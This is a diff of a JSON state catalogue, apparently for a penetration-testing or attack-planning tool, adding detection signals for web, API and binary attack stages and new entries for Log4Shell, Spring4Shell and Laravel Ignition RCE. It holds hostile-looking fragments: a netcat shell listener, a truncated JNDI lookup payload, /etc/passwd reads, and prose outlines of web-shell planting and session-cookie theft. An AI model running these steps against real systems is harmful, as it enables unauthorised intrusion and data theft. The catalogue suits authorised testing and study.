+          "description": "Key authenticates successfully and reveals its permission scope"
+        }
+      ]
     },
     {
       "state_id": "hardcoded_secrets_confirmed",
@@ -737,7 +1419,13 @@
       "target_types": [
         "other"
       ],
-      "playbook_ref": "hardcoded_secrets"
+      "playbook_ref": "hardcoded_secrets",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "List of resources/actions accessible with the leaked credential"
+        }
+      ]
     },
     {
       "state_id": "hardcoded_secrets_ruled_out",
@@ -747,7 +1435,13 @@
       "target_types": [
         "other"
       ],
-      "playbook_ref": "hardcoded_secrets"
+      "playbook_ref": "hardcoded_secrets",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "http_request_smuggling_after_step1",
@@ -757,7 +1451,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "http_request_smuggling"
+      "playbook_ref": "http_request_smuggling",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Distinct server signatures/headers suggest a multi-hop architecture"
+        }
+      ]
     },
     {
       "state_id": "http_request_smuggling_after_step2",
@@ -767,7 +1467,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "http_request_smuggling"
+      "playbook_ref": "http_request_smuggling",
+      "detection_signals": [
+        {
+          "signal_type": "timing",
+          "description": "Timing or response anomalies indicate the two servers parsed the request boundary differently"
+        }
+      ]
     },
     {
       "state_id": "http_request_smuggling_after_step3",
@@ -777,7 +1483,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "http_request_smuggling"
+      "playbook_ref": "http_request_smuggling",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "A subsequent, unrelated request/response is contaminated by the smuggled request"
+        }
+      ]
     },
     {
       "state_id": "http_request_smuggling_confirmed",
@@ -787,7 +1499,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "http_request_smuggling"
+      "playbook_ref": "http_request_smuggling",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Attacker-controlled content is served to a victim, or a security control (e.g. auth check) is bypassed"
+        }
+      ]
     },
     {
       "state_id": "http_request_smuggling_ruled_out",
@@ -797,7 +1515,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "http_request_smuggling"
+      "playbook_ref": "http_request_smuggling",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "idor_after_step1",
@@ -807,7 +1531,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "idor"
+      "playbook_ref": "idor",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "List of endpoints with id-like parameters (order_id, user_id, file, uuid)"
+        }
+      ]
     },
     {
       "state_id": "idor_after_step2",
@@ -817,7 +1547,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "idor"
+      "playbook_ref": "idor",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "200 response containing user A's own object data"
+        }
+      ]
     },
     {
       "state_id": "idor_after_step3",
@@ -827,7 +1563,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "idor"
+      "playbook_ref": "idor",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "If access control is broken, the response returns user A's object data to user B"
+        }
+      ]
     },
     {
       "state_id": "idor_after_step4",
@@ -837,7 +1579,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "idor"
+      "playbook_ref": "idor",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Multiple unrelated objects accessible across the ID space"
+        }
+      ]
     },
     {
       "state_id": "idor_confirmed",
@@ -847,7 +1595,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "idor"
+      "playbook_ref": "idor",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Unauthorized modification or deletion succeeds"
+        }
+      ]
     },
     {
       "state_id": "idor_ruled_out",
@@ -857,7 +1611,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "idor"
+      "playbook_ref": "idor",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "information_disclosure_after_step1",
@@ -867,7 +1627,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "information_disclosure"
+      "playbook_ref": "information_disclosure",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Stack traces, internal paths, or extra object fields present in responses"
+        }
+      ]
     },
     {
       "state_id": "information_disclosure_after_step2",
@@ -877,7 +1643,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "information_disclosure"
+      "playbook_ref": "information_disclosure",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "API response includes sensitive fields not shown in the UI (e.g. hashed password, internal notes)"
+        }
+      ]
     },
     {
       "state_id": "information_disclosure_after_step3",
@@ -887,7 +1659,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "information_disclosure"
+      "playbook_ref": "information_disclosure",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Sensitive file or exposed storage bucket accessible without authentication"
+        }
+      ]
     },
     {
       "state_id": "information_disclosure_confirmed",
@@ -897,7 +1675,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "information_disclosure"
+      "playbook_ref": "information_disclosure",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Data classified (PII, credentials, internal source) and access path confirmed unauthenticated/low-privilege"
+        }
+      ]
     },
     {
       "state_id": "information_disclosure_ruled_out",
@@ -907,7 +1691,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "information_disclosure"
+      "playbook_ref": "information_disclosure",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "insecure_deserialization_after_step1",
@@ -917,7 +1707,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "insecure_deserialization"
+      "playbook_ref": "insecure_deserialization",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Base64/binary blob matches a known serialization format (Java, PHP, Python pickle, .NET)"
+        }
+      ]
     },
     {
       "state_id": "insecure_deserialization_after_step2",
@@ -927,7 +1723,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "insecure_deserialization"
+      "playbook_ref": "insecure_deserialization",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Stack trace or error references the deserializer class"
+        }
+      ]
     },
     {
       "state_id": "insecure_deserialization_after_step3",
@@ -937,7 +1739,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "insecure_deserialization"
+      "playbook_ref": "insecure_deserialization",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Known gadget chain available for the detected libraries in use"
+        }
+      ]
     },
     {
       "state_id": "insecure_deserialization_confirmed",
@@ -947,7 +1755,16 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "insecure_deserialization"
+      "playbook_ref": "insecure_deserialization",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "A gadget-chain payload triggers an out-of-band callback or observable side effect upon deserialization.",
+          "examples": [
+            "interactsh logs a DNS hit when a ysoserial-generated payload is submitted as the serialized object"
+          ]
+        }
+      ]
     },
     {
       "state_id": "insecure_deserialization_ruled_out",
@@ -957,7 +1774,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "insecure_deserialization"
+      "playbook_ref": "insecure_deserialization",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "jwt_vulnerabilities_after_step1",
@@ -967,7 +1790,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "jwt_vulnerabilities"
+      "playbook_ref": "jwt_vulnerabilities",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "Algorithm (HS256/RS256/none) and any embedded key/kid claim visible"
+        }
+      ]
     },
     {
       "state_id": "jwt_vulnerabilities_after_step2",
@@ -977,7 +1806,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "jwt_vulnerabilities"
+      "playbook_ref": "jwt_vulnerabilities",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "Server accepts the forged HS256 token signed with the public key"
+        }
+      ]
     },
     {
       "state_id": "jwt_vulnerabilities_after_step3",
@@ -987,7 +1822,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "jwt_vulnerabilities"
+      "playbook_ref": "jwt_vulnerabilities",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "Server accepts an unsigned token"
+        }
+      ]
     },
     {
       "state_id": "jwt_vulnerabilities_after_step4",
@@ -997,7 +1838,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "jwt_vulnerabilities"
+      "playbook_ref": "jwt_vulnerabilities",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "Secret recovered, allowing arbitrary token forgery"
+        }
+      ]
     },
     {
       "state_id": "jwt_vulnerabilities_confirmed",
@@ -1007,7 +1854,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "jwt_vulnerabilities"
+      "playbook_ref": "jwt_vulnerabilities",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Expired or revoked token is still accepted"
+        }
+      ]
     },
     {
       "state_id": "jwt_vulnerabilities_ruled_out",
@@ -1017,7 +1870,101 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "jwt_vulnerabilities"
+      "playbook_ref": "jwt_vulnerabilities",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
+    },
+    {
+      "state_id": "laravel_debug_identified",
+      "description": "Target is fingerprinted as a Laravel application running with debug mode (Ignition error page) enabled.",
+      "tier": "recon",
+      "value": "low",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null,
+      "technology": "Laravel/Ignition",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Triggering an application error returns the Ignition debug page instead of a generic error.",
+          "examples": [
+            "forcing a 500 error returns a page with \"Ignition\" branding and a stack trace with local file paths"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "laravel_ignition_confirmed",
+      "description": "Laravel Ignition debug-mode RCE confirmed exploitable.",
+      "tier": "vulnerability_confirmed",
+      "value": "critical",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null,
+      "technology": "Laravel/Ignition",
+      "cve_refs": [
+        "CVE-2021-3129"
+      ],
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "A crafted request abusing Ignition's file_get_contents/file_put_contents debug functionality writes and executes a malicious file.",
+          "examples": [
+            "a written file is subsequently retrievable and executes injected PHP code"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "laravel_ruled_out",
+      "description": "The Laravel Ignition RCE exploit was not successful against this target.",
+      "tier": "ruled_out",
+      "value": "none",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null
+    },
+    {
+      "state_id": "log4j_jndi_rce_confirmed",
+      "description": "Log4Shell (Log4j2 JNDI injection) RCE confirmed exploitable.",
+      "tier": "vulnerability_confirmed",
+      "value": "critical",
+      "target_types": [
+        "web",
+        "api"
+      ],
+      "playbook_ref": null,
+      "technology": "Apache Log4j2",
+      "cve_refs": [
+        "CVE-2021-44228"
+      ],
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "An out-of-band LDAP/DNS callback fires after a JNDI lookup payload is submitted in any logged input, and a subsequent weaponized callback achieves class loading.",
+          "examples": [
+            "interactsh/Collaborator logs an LDAP lookup correlated to the injected ${jndi:ldap://...} payload"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "log4j_rce_ruled_out",
+      "description": "No JNDI injection callback was observed across the probed input points.",
+      "tier": "ruled_out",
+      "value": "none",
+      "target_types": [
+        "web",
+        "api"
+      ],
+      "playbook_ref": null
     },
     {
       "state_id": "low_priv_shell_obtained",
@@ -1030,7 +1977,18 @@
         "network",
         "binary"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "A listener/handler receives a connection and shell commands return expected output rather than an error.",
+          "examples": [
+            "nc -lvnp <port> shows 'connection from ...'",
+            "`id` returns uid=1000(www-data) instead of a connection error",
+            "webshell endpoint returns command output in its HTTP response body"
+          ]
+        }
+      ]
     },
     {
       "state_id": "mass_assignment_after_step1",
@@ -1040,7 +1998,13 @@
       "target_types": [
         "api"
       ],
-      "playbook_ref": "mass_assignment"
+      "playbook_ref": "mass_assignment",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Full field list of the underlying object, including fields not shown in the normal form (role, isAdmin, balance)"
+        }
+      ]
     },
     {
       "state_id": "mass_assignment_after_step2",
@@ -1050,7 +2014,13 @@
       "target_types": [
         "api"
       ],
-      "playbook_ref": "mass_assignment"
+      "playbook_ref": "mass_assignment",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Response or subsequent fetch shows the extra field was actually updated"
+        }
+      ]
     },
     {
       "state_id": "mass_assignment_confirmed",
@@ -1060,7 +2030,13 @@
       "target_types": [
         "api"
       ],
-      "playbook_ref": "mass_assignment"
+      "playbook_ref": "mass_assignment",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Privileged field successfully modified via the unprivileged update endpoint"
+        }
+      ]
     },
     {
       "state_id": "mass_assignment_ruled_out",
@@ -1070,7 +2046,13 @@
       "target_types": [
         "api"
       ],
-      "playbook_ref": "mass_assignment"
+      "playbook_ref": "mass_assignment",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "memory_corruption_after_step1",
@@ -1080,7 +2062,13 @@
       "target_types": [
         "binary"
       ],
-      "playbook_ref": "memory_corruption"
+      "playbook_ref": "memory_corruption",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "Crashing inputs discovered and triaged by unique crash signature"
+        }
+      ]
     },
     {
       "state_id": "memory_corruption_after_step2",
@@ -1090,7 +2078,13 @@
       "target_types": [
         "binary"
       ],
-      "playbook_ref": "memory_corruption"
+      "playbook_ref": "memory_corruption",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "Sanitizer report identifies exact bug class and faulting memory access"
+        }
+      ]
     },
     {
       "state_id": "memory_corruption_after_step3",
@@ -1100,7 +2094,13 @@
       "target_types": [
         "binary"
       ],
-      "playbook_ref": "memory_corruption"
+      "playbook_ref": "memory_corruption",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "Degree of read/write primitive established (e.g. controlled-size heap overflow)"
+        }
+      ]
     },
     {
       "state_id": "memory_corruption_confirmed",
@@ -1110,7 +2110,13 @@
       "target_types": [
         "binary"
       ],
-      "playbook_ref": "memory_corruption"
+      "playbook_ref": "memory_corruption",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "Working proof-of-concept achieving controlled crash, info leak, or code execution"
+        }
+      ]
     },
     {
       "state_id": "memory_corruption_ruled_out",
@@ -1120,7 +2126,13 @@
       "target_types": [
         "binary"
       ],
-      "playbook_ref": "memory_corruption"
+      "playbook_ref": "memory_corruption",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "network_target_identified",
@@ -1130,7 +2142,13 @@
       "target_types": [
         "network"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Target is confirmed in-scope and reachable (rules of engagement / scope document)."
+        }
+      ]
     },
     {
       "state_id": "oauth_misconfiguration_after_step1",
@@ -1140,7 +2158,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "oauth_misconfiguration"
+      "playbook_ref": "oauth_misconfiguration",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Full sequence of authorize/token/callback requests recorded"
+        }
+      ]
     },
     {
       "state_id": "oauth_misconfiguration_after_step2",
@@ -1150,7 +2174,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "oauth_misconfiguration"
+      "playbook_ref": "oauth_misconfiguration",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Authorization server accepts an attacker-controlled redirect_uri variant"
+        }
+      ]
     },
     {
       "state_id": "oauth_misconfiguration_after_step3",
@@ -1160,7 +2190,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "oauth_misconfiguration"
+      "playbook_ref": "oauth_misconfiguration",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Flow completes successfully with state omitted or reused"
+        }
+      ]
     },
     {
       "state_id": "oauth_misconfiguration_confirmed",
@@ -1170,7 +2206,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "oauth_misconfiguration"
+      "playbook_ref": "oauth_misconfiguration",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Attacker links their OAuth identity to a victim account without proving ownership"
+        }
+      ]
     },
     {
       "state_id": "oauth_misconfiguration_ruled_out",
@@ -1180,7 +2222,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "oauth_misconfiguration"
+      "playbook_ref": "oauth_misconfiguration",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "open_redirect_after_step1",
@@ -1190,7 +2238,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "open_redirect"
+      "playbook_ref": "open_redirect",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Parameter controls the Location header or client-side redirect"
+        }
+      ]
     },
     {
       "state_id": "open_redirect_after_step2",
@@ -1200,7 +2254,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "open_redirect"
+      "playbook_ref": "open_redirect",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "302/JS redirect points to the attacker-controlled external domain"
+        }
+      ]
     },
     {
       "state_id": "open_redirect_after_step3",
@@ -1210,7 +2270,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "open_redirect"
+      "playbook_ref": "open_redirect",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Redirect succeeds despite a naive allow-list check"
+        }
+      ]
     },
     {
       "state_id": "open_redirect_confirmed",
@@ -1220,7 +2286,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "open_redirect"
+      "playbook_ref": "open_redirect",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Sensitive token/parameter is leaked to the external domain via the referrer or redirect chain"
+        }
+      ]
     },
     {
       "state_id": "open_redirect_ruled_out",
@@ -1230,7 +2302,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "open_redirect"
+      "playbook_ref": "open_redirect",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "other_target_identified",
@@ -1240,7 +2318,13 @@
       "target_types": [
         "other"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Target is confirmed in-scope and reachable (rules of engagement / scope document)."
+        }
+      ]
     },
     {
       "state_id": "path_traversal_after_step1",
@@ -1250,7 +2334,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "path_traversal"
+      "playbook_ref": "path_traversal",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Parameter value maps to a served file"
+        }
+      ]
     },
     {
       "state_id": "path_traversal_after_step2",
@@ -1260,7 +2350,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "path_traversal"
+      "playbook_ref": "path_traversal",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Known file content (e.g. /etc/passwd, win.ini) is returned"
+        }
+      ]
     },
     {
       "state_id": "path_traversal_after_step3",
@@ -1270,7 +2366,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "path_traversal"
+      "playbook_ref": "path_traversal",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Traversal succeeds despite basic sanitization"
+        }
+      ]
     },
     {
       "state_id": "path_traversal_confirmed",
@@ -1280,7 +2382,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "path_traversal"
+      "playbook_ref": "path_traversal",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Sensitive config/secrets retrieved, or included file executes as code"
+        }
+      ]
     },
     {
       "state_id": "path_traversal_ruled_out",
@@ -1290,7 +2398,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "path_traversal"
+      "playbook_ref": "path_traversal",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "privileged_session_obtained",
@@ -1301,7 +2415,17 @@
         "web",
         "api"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "An authenticated request to a privileged/admin-only endpoint returns 200 with admin-scoped data, using the obtained session.",
+          "examples": [
+            "GET /admin/users returns 200 with a user list instead of 403",
+            "response includes a role/scope claim of \"admin\" or \"superuser\""
+          ]
+        }
+      ]
     },
     {
       "state_id": "prototype_pollution_after_step1",
@@ -1311,7 +2435,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "prototype_pollution"
+      "playbook_ref": "prototype_pollution",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Recursive merge/assign function reachable with attacker-controlled keys"
+        }
+      ]
     },
     {
       "state_id": "prototype_pollution_after_step2",
@@ -1321,7 +2451,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "prototype_pollution"
+      "playbook_ref": "prototype_pollution",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "A new property appears on all objects (e.g. {}.polluted === 'yes')"
+        }
+      ]
     },
     {
       "state_id": "prototype_pollution_after_step3",
@@ -1331,7 +2467,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "prototype_pollution"
+      "playbook_ref": "prototype_pollution",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Application behavior changes based on the polluted global property"
+        }
+      ]
     },
     {
       "state_id": "prototype_pollution_confirmed",
@@ -1341,7 +2483,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "prototype_pollution"
+      "playbook_ref": "prototype_pollution",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Concrete security impact (e.g. unauthorized admin UI rendered) confirmed"
+        }
+      ]
     },
     {
       "state_id": "prototype_pollution_ruled_out",
@@ -1351,7 +2499,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "prototype_pollution"
+      "playbook_ref": "prototype_pollution",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "race_condition_after_step1",
@@ -1361,7 +2515,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "race_condition"
+      "playbook_ref": "race_condition",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Candidate endpoint where a value is checked, then consumed, in separate steps"
+        }
+      ]
     },
     {
       "state_id": "race_condition_after_step2",
@@ -1371,7 +2531,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "race_condition"
+      "playbook_ref": "race_condition",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "One unit of the resource is consumed per request under normal conditions"
+        }
+      ]
     },
     {
       "state_id": "race_condition_after_step3",
@@ -1381,7 +2547,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "race_condition"
+      "playbook_ref": "race_condition",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Multiple requests succeed against a resource meant to be single-use"
+        }
+      ]
     },
     {
       "state_id": "race_condition_confirmed",
@@ -1391,7 +2563,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "race_condition"
+      "playbook_ref": "race_condition",
+      "detection_signals": [
+        {
+          "signal_type": "timing",
+          "description": "Final state shows more consumption than should have been possible"
+        }
+      ]
     },
     {
       "state_id": "race_condition_ruled_out",
@@ -1401,7 +2579,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "race_condition"
+      "playbook_ref": "race_condition",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "rce_generic_after_step1",
@@ -1411,7 +2595,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "rce_generic"
+      "playbook_ref": "rce_generic",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Upload/import/render features that touch interpreters or parsers"
+        }
+      ]
     },
     {
       "state_id": "rce_generic_after_step2",
@@ -1421,7 +2611,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "rce_generic"
+      "playbook_ref": "rce_generic",
+      "detection_signals": [
+        {
+          "signal_type": "timing",
+          "description": "Error messages or timing differences reveal the underlying engine/language"
+        }
+      ]
     },
     {
       "state_id": "rce_generic_after_step3",
@@ -1431,7 +2627,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "rce_generic"
+      "playbook_ref": "rce_generic",
+      "detection_signals": [
+        {
+          "signal_type": "timing",
+          "description": "Evaluated result (e.g. computed number, delayed response) confirms code execution"
+        }
+      ]
     },
     {
       "state_id": "rce_generic_confirmed",
@@ -1441,7 +2643,17 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "rce_generic"
+      "playbook_ref": "rce_generic",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "An out-of-band callback fires, or a benign command's output is reflected/observable, proving arbitrary code execution.",
+          "examples": [
+            "interactsh/Collaborator logs a DNS or HTTP hit correlated to the injected payload",
+            "response includes the output of a harmless command like `id` or `whoami`"
+          ]
+        }
+      ]
     },
     {
       "state_id": "rce_generic_ruled_out",
@@ -1451,7 +2663,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "rce_generic"
+      "playbook_ref": "rce_generic",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "sensitive_data_exfiltrated",
@@ -1459,13 +2677,83 @@
       "tier": "full_compromise",
       "value": "high",
       "target_types": [],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Extracted data volume and sensitivity (PII, financial, credentials-adjacent) is sufficient to constitute a reportable breach on its own.",
+          "examples": []
+        }
+      ]
     },
     {
       "state_id": "session_cookie_theft_possible",
       "description": "A path exists to obtain a victim's live session cookie or token.",
       "tier": "capability",
       "value": "high",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "network",
+          "description": "An attacker-controlled endpoint receives a request containing a session cookie/token value from a victim's browser context.",
+          "examples": [
+            "Collaborator/interactsh log shows a GET with a Cookie or token query parameter matching the app's session format"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "spring4shell_confirmed",
+      "description": "Spring4Shell RCE confirmed exploitable via class-loader data binding.",
+      "tier": "vulnerability_confirmed",
+      "value": "critical",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null,
+      "technology": "Spring Framework",
+      "cve_refs": [
+        "CVE-2022-22965"
+      ],
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "A crafted parameter-binding payload that overwrites the Tomcat AccessLogValve pattern results in a subsequently accessible web shell.",
+          "examples": [
+            "a JSP file appears at a predictable path and executes commands passed via a request parameter"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "spring_mvc_identified",
+      "description": "Target is fingerprinted as a Spring MVC/WebFlux application (Spring Boot error pages, Whitelabel Error Page, or actuator endpoints).",
+      "tier": "recon",
+      "value": "low",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null,
+      "technology": "Spring Framework",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Default Spring Boot error response format or reachable /actuator endpoints.",
+          "examples": [
+            "response body contains \"Whitelabel Error Page\"",
+            "GET /actuator/env returns 200 with environment properties"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "spring_mvc_ruled_out",
+      "description": "Spring4Shell-style exploitation was not successful against this target.",
+      "tier": "ruled_out",
+      "value": "none",
       "target_types": [
         "web"
       ],
@@ -1479,7 +2767,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "sqli"
+      "playbook_ref": "sqli",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Parameter values affect returned data set"
+        }
+      ]
     },
     {
       "state_id": "sqli_after_step2",
@@ -1489,7 +2783,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "sqli"
+      "playbook_ref": "sqli",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "Error message, status code, or content length differs between true/false conditions"
+        }
+      ]
     },
     {
